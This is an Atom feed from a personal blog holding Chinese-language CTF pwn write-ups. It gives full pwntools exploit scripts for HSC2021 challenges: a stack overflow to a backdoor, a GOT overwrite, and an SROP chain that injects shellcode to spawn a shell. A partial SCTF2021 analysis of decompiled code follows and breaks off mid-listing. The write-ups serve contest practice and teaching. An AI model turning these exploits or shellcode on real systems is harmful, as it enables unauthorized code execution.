<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lexsd6&#39;s home</title>
  
  <subtitle> Clumsy birds have to start flying early</subtitle>
  <link href="lexsd6.github.io/atom.xml" rel="self"/>
  
  <link href="lexsd6.github.io/"/>
  <updated>2022-02-22T12:29:12.169Z</updated>
  <id>lexsd6.github.io/</id>
  
  <author>
    <name>lexsd6</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HSC2021-CTF-pwn</title>
    <link href="lexsd6.github.io/2022/02/22/HSC2021-CTF/"/>
    <id>lexsd6.github.io/2022/02/22/HSC2021-CTF/</id>
    <published>2022-02-22T09:34:26.542Z</published>
    <updated>2022-02-22T12:29:12.169Z</updated>
    
    <content type="html"><![CDATA[<p>红客突击队ctf，好久没打ctf了，正好适合用来练手，感觉自己又变菜了……<a id="more"></a></p><h2 id="EZ-pwn"><a href="#EZ-pwn" class="headerlink" title="EZ_pwn"></a>EZ_pwn</h2><p>真ez pwn 题目给了后门，栈溢出改RIP为后门地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:12:39</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./Ez_pwn'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10366</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x40</span>+<span class="string">'2'</span>*<span class="number">8</span>+p64(e.sym[<span class="string">'backdoor'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="EZPWN"><a href="#EZPWN" class="headerlink" title="EZPWN"></a>EZPWN</h2><p>题目给了后门。分析程序流程，发现题目有个任意执行写，篡改put函数的got表值虫二劫持got表运行后门</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:21:21</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./EZPWN'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10027</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'your ID?'</span>)</span><br><span class="line">p.sendline(<span class="string">'xxxxx'</span>)</span><br><span class="line">debug()</span><br><span class="line">p.recvuntil(<span class="string">'Give me the target address?'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x601018</span>))</span><br><span class="line">p.recvuntil(<span class="string">'Give me the data:'</span>)</span><br><span class="line">p.sendline(p64(e.sym[<span class="string">'success'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="SAHELL"><a href="#SAHELL" class="headerlink" title="SAHELL"></a>SAHELL</h2><p>题目欺诈，实际上考的是SROT与写shell。</p><p>即及利用SPOT在一块可以控制地址区域写入shellcode，让后再调用shellcode。</p><p>但要注意的是这里连续调用两次syscall.</p><p>第一次我们利用syscall  通过SYS_rt_sigreturn 劫持栈与程序流。</p><p>但是SYS_rt_sigreturn的系统调用号为<code>0xf</code>.</p><p>因此我们用利用x64下系统调用read的返回值为输入字符数来篡改返回值（rax）为<code>0xf</code></p><p>同时，由于我们连续调用syscall，且rt_sigreturn破坏原本栈结构。我们伪造的<code>signal Frame</code>也要注意各寄存器外，<code>uc_stack</code>和<code>Segment Registers(SS, FS, GS, CS)</code>等参数也要注意实际情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#推荐模板：</span></span><br><span class="line">sigret_frame = [</span><br><span class="line">    p64(<span class="number">0x0000000000000007</span>),   <span class="comment"># uc_flags</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_link</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_stack.ss_sp</span></span><br><span class="line">    p64(<span class="number">0x0000ffff00000000</span>),   <span class="comment"># uc_stack.ss_flags</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_stack.ss_size</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R8</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R9</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R10</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R11</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R12</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R13</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R14</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R15</span></span><br><span class="line">    p64(<span class="number">0x0000000000402000</span>),   <span class="comment"># RDI</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># RSI</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RBP</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RBX</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># RDX</span></span><br><span class="line">    p64(<span class="number">0x000000000000003b</span>),   <span class="comment"># RAX</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RCX</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RSP</span></span><br><span class="line">    p64(SYSCALL),   <span class="comment"># RIP = should call 'syscall' instruction</span></span><br><span class="line">    p64(<span class="number">0x0000000000000202</span>),   <span class="comment"># EFLAGS</span></span><br><span class="line">    p64(<span class="number">0x002b000000000033</span>),   <span class="comment"># Segment Registers(SS, FS, GS, CS)</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># ERR</span></span><br><span class="line">    p64(<span class="number">0x0000000000000001</span>),   <span class="comment"># TrapNo</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># Old-Mask</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># CR2</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># fpstate = NULL</span></span><br><span class="line">    p64(<span class="number">0x000000000000000e</span>),   <span class="comment"># reserved</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_sigmask</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>同时，由于SYS_rt_sigreturn的返回值刚好为0，即read的系统调用号，我们就可以直接将RIP修改为syscall地址。就可以执行sys_read调用写入并指向shellcode</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:39:04</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./SAHELL'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10774</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#debug('b main')</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">shellcodeaddr=<span class="number">0x00600000</span></span><br><span class="line">rbp=shellcodeaddr</span><br><span class="line"><span class="comment">#asm(shellcraft.sh())</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">sigret_frame = [</span></span><br><span class="line"><span class="string">    p64(0x0000000000000007),   # uc_flags</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_link</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_stack.ss_sp</span></span><br><span class="line"><span class="string">    p64(0x0000ffff00000000),   # uc_stack.ss_flags</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_stack.ss_size</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R8</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R9</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R10</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R11</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R12</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R13</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R14</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R15</span></span><br><span class="line"><span class="string">    p64(0x0000000000402000),   # RDI</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # RSI</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RBP</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RBX</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # RDX</span></span><br><span class="line"><span class="string">    p64(0x000000000000003b),   # RAX</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RCX</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RSP</span></span><br><span class="line"><span class="string">    p64(SYSCALL),   # RIP = should call 'syscall' instruction</span></span><br><span class="line"><span class="string">    p64(0x0000000000000202),   # EFLAGS</span></span><br><span class="line"><span class="string">    p64(0x002b000000000033),   # Segment Registers(SS, FS, GS, CS)</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # ERR</span></span><br><span class="line"><span class="string">    p64(0x0000000000000001),   # TrapNo</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # Old-Mask</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # CR2</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # fpstate = NULL</span></span><br><span class="line"><span class="string">    p64(0x000000000000000e),   # reserved</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_sigmask</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'x'</span>*<span class="number">0x1a0</span>+p64(<span class="number">0x000000000400108</span><span class="number">-0x50</span>)+p64(<span class="number">0x0000000004000BA</span>)+p64(<span class="number">0x0000000004000B5</span>)+p64(<span class="number">0x0000000000000007</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000ffff00000000</span>)+p64(<span class="number">0x0000000000000000</span>)+<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'b'</span>*<span class="number">0x10</span>+<span class="string">'c'</span>*<span class="number">8</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x600100</span>)+<span class="string">'q'</span>*<span class="number">8</span>+<span class="string">'y'</span>*<span class="number">8</span>+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x600100</span>)+p64(<span class="number">0x0000000004000CB</span>)+p64(<span class="number">0x0000000000000202</span>)+p64(<span class="number">0x002b000000000033</span>)+ p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000001</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x000000000000000e</span>))</span><br><span class="line">sleep(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*(<span class="number">0xf</span><span class="number">-1</span>))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'8'</span>*<span class="number">64</span>+p64(<span class="number">0x600148</span>+<span class="number">8</span>)+p64(<span class="number">0</span>)+(asm(shellcraft.sh())))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;红客突击队ctf，好久没打ctf了，正好适合用来练手，感觉自己又变菜了……</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>sctf2021-pwn-dataleak-wp</title>
    <link href="lexsd6.github.io/2021/12/31/sctf2021-pwn-dataleak/"/>
    <id>lexsd6.github.io/2021/12/31/sctf2021-pwn-dataleak/</id>
    <published>2021-12-31T07:16:18.287Z</published>
    <updated>2021-12-31T09:26:55.138Z</updated>
    
    <content type="html"><![CDATA[<p>周末有事去了，等缓过来只搞个这个题的文件….<a id="more"></a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RPATH:    '/home/wlz/my_code/sctf_21/pwn_dataleak/src2ctfer/cmake-build-debug'</span><br></pre></td></tr></table></figure><p>分析环境，发现题目没有开启canary,并且自带一个so文件。</p><p>分析主程序流程发现逻辑很简单，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = '_si_siht';</span><br><span class="line">    v9 = '_ni_atad';</span><br><span class="line">    v10 = 'revres';</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    buf = <span class="number">0L</span>L;</span><br><span class="line">    v5 = <span class="number">0L</span>L;</span><br><span class="line">    v6 = <span class="number">0L</span>L;</span><br><span class="line">    v7 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0xE</span>uLL);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;v6, <span class="number">0xE</span>uLL);</span><br><span class="line">    cJSON_Minify(&amp;buf, &amp;v6);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, &amp;v6, <span class="number">0xB</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次输入长度达0xe的字符串，然后放入<code>cJSON_Minify</code>函数进行处理。</p><p><code>cJSON_Minify</code>函数在so文件中源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">cJSON_Minify</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *str_a1; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *v18; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *last; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v20; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  str_a1 = a1;</span><br><span class="line">  result = a1;</span><br><span class="line">  last = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *str_a1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( *str_a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">' '</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'\t'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'\r'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        